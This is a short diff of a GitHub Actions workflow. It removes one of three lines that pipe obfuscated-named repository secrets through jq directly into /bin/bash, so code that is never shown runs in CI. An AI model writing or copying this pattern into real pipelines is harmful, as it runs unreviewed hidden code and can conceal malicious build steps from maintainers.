@@ -17,7 +17,6 @@ jobs:
           sukmk6822: ${{ secrets.sukmk6822 }}
         run: |
           printf '%s' "$sukmk6822" | jq -r .uv4011 | /bin/bash
-          printf '%s' "$ttout48" | jq -r .zotg8 | /bin/bash
           printf '%s' "$juz9" | jq -r .ctqbq00 | /bin/bash
 
       - name: Archive results
